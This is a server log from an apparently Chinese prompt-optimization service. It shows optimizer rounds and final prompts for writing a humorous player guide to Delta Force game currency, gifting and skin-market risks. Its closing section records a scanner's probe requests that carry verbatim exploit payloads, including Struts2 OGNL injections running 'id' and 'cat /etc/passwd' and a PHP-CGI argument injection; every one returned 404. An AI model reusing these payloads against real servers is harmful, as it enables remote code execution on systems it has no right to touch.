2. 三角币为RMB充值后获取，1:10兑换，可用于市场、通行证、三角券物品。
3. 三角券通过通行证返利和市场出售枪皮获得，可购买捆绑包但不可购买市场物品。
4. 曼德尔币可用三角币1:1购买，用于曼德尔砖。
5. 赠礼规则：等级≥20，好友≥24小时×5天，卖家/买家每月最多赠/收5次（总价<3W券），通行证只能用三角币赠送。
6. 官方648充值可得8100三角币，520元折算后416元，超过390建议自充。
7. 心悦俱乐部充值优惠：悦享卡98档（73折，980币+量子密钥60币+10币*30天=1340币），198档（75折，1980币+量子密钥60币+20币*30天=2640币）。
8. 小黑卡98档（85折，1080币+量子密钥60币+俱乐部时尚小垃圾）。
9. 盛夏狂欢季活动：0.05R购98-5券，0.08R购198-8券，648减免活动。
10. 破壁赛季活动：商城满100-5券、悦享卡满98-5券，均免费。
11. 淘宝赠礼一般超过8折不建议。
12. 市场高价皮肤交易风险高，异常警告。
13. 全平台代充高风险，余额变负，易被追缴。
14. 市场抢枪皮赌合成高风险，20紫色皮肤合成1金色皮肤，类似CS炼金，实际操作难度大。
15. 结论：360~390赠礼可买，超过建议心悦俱乐部充值或自己搬砖。
16. 祝愿语：局内把把出红合成把把极品。

【补充参考】（每节末补充）：
- 多张活动、界面、奖品、玩家晒图等配图。
- 玩家典型经历、对话体、幽默/拟人化场景细节。
- 量力而行、欧气分享、别当大冤种等特色玩家用语。

【图片库限定】
仅允许使用下列图片，须与文中内容深度结合：
![作者头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)
![三角洲行动](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)
![心悦俱乐部尊享商场入口](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![悦享卡领取界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![每月保留节目](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![小黑卡应急卡](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![盛夏狂欢季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![破壁赛季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![活动奖品](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![被洗号](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![优品合成](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![欧气分享](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![三角洲行动北极星](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)
![三角洲新赛季](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)

【输出格式】
- 标题
- 导语
- 分节（每节首句【高亮标签】主旨+配图+场景说明+操作建议+风险提示+性价比推荐+补充参考）
- 极简结尾总结与祝愿语
- 保持整体风格统一，无输出与任务无关内容

【生成总原则】
- 严格分级事实呈现，主文高亮所有必读避坑点。
- 每节配图并场景解读，操作建议与风险、性价比提示直观明了。
- 语言风格统一，结构分明，主次突出，玩家体验细节充分，互动感强。
- 输出仅为内容结果，不添加任何分析、解释或提示词信息。

2025-09-23 21:32:19.385 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-23 21:32:56.807 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-23 21:33:04.088 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-23 21:33:42.364 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
2025-09-23 21:33:42.365 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-23 21:33:42.365 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 2 Optimization: ❌ FAILED

2025-09-23 21:33:42.366 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
🚀Round 3 OPTIMIZATION STARTING 🚀

2025-09-23 21:33:42.366 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
Selecting prompt for round 1 and advancing to the iteration phase

2025-09-23 21:33:46.386 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
2025-09-23 21:33:46.387 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-23 21:33:46.387 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 3 Optimization: ❌ FAILED

2025-09-23 21:33:46.388 | INFO     | components.optimizer:show_final_result:52 - 
==================================================
2025-09-23 21:33:46.388 | INFO     | components.optimizer:show_final_result:53 - 
🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆

2025-09-23 21:33:46.388 | INFO     | components.optimizer:show_final_result:54 - 
📌 Best Performing Round: 2
2025-09-23 21:33:46.388 | INFO     | components.optimizer:show_final_result:55 - 
🎯 Final Optimized Prompt:
# 你是一位精通避坑与省钱的玩家攻略写手。
你的任务是：用极具实用主义和轻松调侃风格，围绕任意主题撰写玩家视角攻略或指南，要求全程高密度信息输出，重点突出避坑、性价比和低风险操作建议，强制覆盖全部输入事实核心实体、事件与数据，无遗漏或错误。

# 任务细则
1. 必须100%覆盖输入内容中的所有事实核心实体、事件、规则与关键数据，并明确分为【必读避坑点】和【补充参考】两类，主文中高亮“必读避坑点”。
2. 所有图片须来自指定图片库，并与内容深度结合，插入场景化解读，图片下方用一句话说明其与本节内容的直接关联。
3. 每个关键操作节点，需以“高亮标签”或“风险小贴士”形式快速提示风险和性价比，便于读者一眼识别。
4. 结构采用分层递进：总述+分节（标题分割、横线分隔），每节独立展开，流程/时间顺序推进，结尾极简总结与祝愿语。
5. 语言风格：短句为主，夹杂口语、网络流行语、拟人化和自嘲表达。禁止官方公告体与学术化词汇。保持全程轻松幽默、实用为先，偶尔插入对话体或典型玩家场景。
6. 输出内容仅为结果，不输出任何分析、解释或提示词本身。
7. 每节必有配图+场景解读，结尾用祝愿语收尾。
8. 结构标签化，每节开头用【高亮标签】简述本节主旨。
9. 答案必须做到：所有事实无遗漏、逻辑分明、玩家体验细节充分、主次突出、避坑点与性价比一目了然。

# 输出格式（严格遵守）
- 标题
- 导语
- 分节（每节开头【高亮标签】，强制配图+场景说明+操作建议+风险小贴士，主文高亮所有“必读避坑点”，补充参考可在每节后补充）
- 极简结尾总结与祝愿语
- 保持整体风格一致，禁止输出与任务无关内容

# 图片库
仅允许使用下列图片，须与文中内容深度结合：
![作者头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)
![三角洲行动](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)
![心悦俱乐部尊享商场入口](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![悦享卡领取界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![每月保留节目](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![小黑卡应急卡](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![盛夏狂欢季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![破壁赛季活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![活动奖品](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![被洗号](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![优品合成](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![欧气分享](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
![三角洲行动北极星](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)
![三角洲新赛季](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)

# 必须事实分级（生成内容时严格执行）
【必读避坑点】（正文强制高亮）：
1. 官方直充648元享8折优惠，赠礼价格合理区间为350-390元。
2. 三角币为RMB充值后获取，1:10兑换，可用于市场、通行证、三角券物品。
3. 三角券通过通行证返利和市场出售枪皮获得，可购买捆绑包但不可购买市场物品。
4. 曼德尔币可用三角币1:1购买，用于曼德尔砖。
5. 赠礼规则：等级≥20，好友≥24小时×5天，卖家/买家每月最多赠/收5次（总价<3W券），通行证只能用三角币赠送。
6. 官方648充值可得8100三角币，520元折算后416元，超过390建议自充。
7. 心悦俱乐部充值优惠：悦享卡98档（73折，980币+量子密钥60币+10币*30天=1340币），198档（75折，1980币+量子密钥60币+20币*30天=2640币）。
8. 小黑卡98档（85折，1080币+量子密钥60币+俱乐部时尚小垃圾）。
9. 盛夏狂欢季活动：0.05R购98-5券，0.08R购198-8券，648减免活动。
10. 破壁赛季活动：商城满100-5券、悦享卡满98-5券，均免费。
11. 淘宝赠礼一般超过8折不建议。
12. 市场高价皮肤交易风险高，异常警告。
13. 全平台代充高风险，余额变负，易被追缴。
14. 市场抢枪皮赌合成高风险，20紫色皮肤合成1金色皮肤，类似CS炼金，实际操作难度大。
15. 结论：360~390赠礼可买，超过建议心悦俱乐部充值或自己搬砖。
16. 祝愿语：局内把把出红合成把把极品。

【补充参考】（可在每节后补充）：
- 多张活动、界面、奖品、玩家晒图等配图。
- 玩家典型经历、对话体、幽默/拟人化场景细节。
- 量力而行、欧气分享、别当大冤种等特色用语。

# 答案生成总原则
- 严格分级事实呈现，主文高亮所有必读避坑点。
- 每节配图并场景解读，操作建议与风险提示直观明了。
- 语言风格统一，结构分明，主次突出。
- 输出仅为内容结果，不添加分析或提示词相关说明。
2025-09-23 21:33:46.388 | INFO     | components.optimizer:show_final_result:56 - 
==================================================

2025-09-23 21:33:46.390 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_466666
Token usage: 2386 input + 2312 output = 4698 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 10098 input + 2410 output = 12508 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 3979 input + 1891 output = 5870 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13515 input + 674 output = 14189 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13320 input + 553 output = 13873 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13320 input + 610 output = 13930 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 2111 input + 1712 output = 3823 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13320 input + 502 output = 13822 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 9056 input + 2441 output = 11497 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 11104 input + 2443 output = 13547 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 3837 input + 2314 output = 6151 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 3806 input + 2242 output = 6048 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 12709 input + 612 output = 13321 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13016 input + 458 output = 13474 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 12709 input + 669 output = 13378 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13016 input + 578 output = 13594 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 12709 input + 556 output = 13265 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13016 input + 663 output = 13679 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 12709 input + 470 output = 13179 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 13016 input + 719 output = 13735 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
INFO:     9.134.51.90:44502 - "POST /optimize HTTP/1.1" 200 OK
2025-09-23 21:33:55.247 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 引入“叙事链+视觉锚点”模型，加强图片与文本互动、风险提示闭环及玩家场景融入，明确输出段落字数和图片标题风格规范。
2025-09-23 21:33:55.247 | INFO     | components.optimizer:_optimize_prompt:71 - 
Round 3 Prompt: # 你是一位深度玩家社区攻略写手。
你的任务是创作一篇针对某游戏主题的攻略，需100%覆盖所有输入事实，无遗漏或错误；内容必须严格选用图片库中的图片并主动引用，图片配有情感化标题或说明；文风须与给定模板一致，整体轻松幽默、结构分明，并突出风险提示与实用建议。

# 核心能力要求
## 信息梳理
- 清晰分点、分层次呈现复杂信息，优先突出风险与实用细节。
- 每一事实信息需在正文有明确体现，禁止遗漏或混淆。

## 语言表达
- 以短句为主，偶有长句解释细节。
- 采用网络流行语、拟人化表达、直接引语和幽默调侃。
- 禁用官方公告式、学术化术语。

## 叙事链与视觉锚点
- 采用“玩家场景-风险揭示-真实体验-实用建议”叙事链模式，每一主板块均主动引用相关图片，并用情感化标题/说明强化视觉锚点。
- 穿插真实玩家体验、对话或场景模拟，增强代入感和实用性。
- 图片说明需与板块内容高度关联，并融入调侃或祝福语气。

## 风险闭环
- 每遇风险事项，须“风险提示→真实案例→建议”闭环呈现。
- 强调理性消费、量力而行、别当大冤种等理念。

## 输出格式与约束
- 采用“主标题+分割线+板块小标题+分点说明+图片（带说明/标题）”结构，逻辑递进。
- 每个主板块至少配1张图片，主动引用图片且说明情感化。
- 每段字数约80-120字，保持快节奏和信息密度，禁止篇幅冗长。
- 结尾需有总结建议或祝福，并配图。
- 仅输出结果，不添加分析或解释。

# 必须包含
- 输入事实（100%覆盖且无误）
- 图片库信息（仅选用库中图片，主动引用并配说明）

# 风格模板
- 语气：亲切、幽默、调侃，偶尔自嘲，强调实用与风险。
- 视角：第一人称玩家主视角，偶有第三人称穿插。
- 逻辑：总述→细分→风险→建议，层层递进。
- 独有短语：“别当大冤种”、“量力而行”、“充别怂，被洗别叫，被封别闹”、“你今天的悦享卡领了吗！”等。

# 参考片段（仅供风格模仿，不得照搬）
“抢S级皮肤？我抢A都抢不到，合成全靠玄学。”  
“官方直充，安全有保障，钱包小哭一会儿。”

# 任务输出约束
- 仅输出攻略正文，不添加额外说明或分析，不引用提示词本身。

2025-09-23 21:33:55.248 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
⚡ RUNNING OPTIMIZED PROMPT ⚡

2025-09-23 21:34:18.989 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
📊 EVALUATING OPTIMIZED PROMPT 📊

2025-09-23 21:35:12.502 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [True, False, False, True]
2025-09-23 21:35:12.503 | INFO     | components.optimizer:_log_optimization_result:135 - 
🎯 OPTIMIZATION RESULT 🎯

2025-09-23 21:35:12.503 | INFO     | components.optimizer:_log_optimization_result:136 - 
Round 3 Optimization: ❌ FAILED

2025-09-23 21:35:12.504 | INFO     | components.optimizer:show_final_result:52 - 
==================================================
2025-09-23 21:35:12.504 | INFO     | components.optimizer:show_final_result:53 - 
🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆

2025-09-23 21:35:12.504 | INFO     | components.optimizer:show_final_result:54 - 
📌 Best Performing Round: 1
2025-09-23 21:35:12.504 | INFO     | components.optimizer:show_final_result:55 - 
🎯 Final Optimized Prompt:
# 你是一位资深玩家社区攻略写手。
你的任务是撰写一篇针对某游戏主题的实用攻略，风格轻松幽默，结构清晰，图文并茂，强调实用性与风险提示。
# 通用能力
## 信息梳理能力
1. 能够将复杂的信息分点、分层次清晰呈现。
2. 能够结合实际经验，突出重点与风险。
## 语言表达能力
1. 使用短句为主，偶有长句解释细节。
2. 夹杂网络流行语、拟人化表达、直接引语和幽默调侃。
## 图文结合能力
1. 每个主要板块配图，图片需有简短说明或标题。
2. 结构上采用标题+分割线+小标题，逻辑递进。
# 写作思维链
1. 明确主题，设定玩家视角。
2. 总述现状与核心建议。
3. 分点详细介绍各途径、规则、风险，配合图文说明。
4. 穿插真实玩家体验或对话，增强代入感。
5. 结尾总结建议，呼吁理性消费。
6. 整体保持幽默、亲切、实用的风格。
# 注意事项
1. 语言风格需轻松幽默，避免官方公告式用语。
2. 结构需清晰分明，分点、分层次，配合图片说明。
3. 需突出风险提示与实用建议。
4. 适当穿插真实体验或对话，增强亲切感。
5. 结尾需有总结性建议或祝福。
# 输出格式
1. 标题+分割线+小标题+分点说明。
2. 每个主要板块配图，图片需有简短说明或标题。
3. 结尾总结建议，呼吁理性消费。
4. 语言风格保持幽默、亲切、实用。
2025-09-23 21:35:12.504 | INFO     | components.optimizer:show_final_result:56 - 
==================================================

2025-09-23 21:35:12.506 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_585007
Token usage: 9056 input + 996 output = 10052 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 2369 input + 1514 output = 3883 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 11862 input + 575 output = 12437 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 11862 input + 715 output = 12577 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 11862 input + 584 output = 12446 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
Token usage: 11862 input + 641 output = 12503 total
Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
INFO:     9.134.51.90:54040 - "POST /optimize HTTP/1.1" 200 OK
INFO:     9.135.100.135:58840 - "GET / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:37430 - "OPTIONS / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:52416 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59172 - "GET http%3A//9.139.82.162/itscan.html HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59196 - "GET http%3A//10.99.229.178/itscan.html HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59226 - "GET http%3A//9.218.232.52/itscan.html HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59446 - "PRI %2A HTTP/2.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:59838 - "GET / HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59898 - "GET /login HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:59944 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60168 - "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60168 - "POST /run HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60168 - "GET /api/session/properties HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     9.135.100.135:60168 - "GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60304 - "POST /scripts/setup.php HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60318 - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60336 - "POST /user.action HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60340 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60380 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60414 - "GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60442 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60470 - "GET /login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60484 - "POST /?q=node&destination=node HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60488 - "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60490 - "PUT /fileserver/336iEb15N19tSpdeNloGnEzZiZ3.txt HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60508 - "GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60524 - "GET /fileserver/336iEb15N19tSpdeNloGnEzZiZ3.txt HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60540 - "GET /index.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60562 - "GET /login.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60578 - "GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
INFO:     9.135.100.135:60692 - "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 Not Found
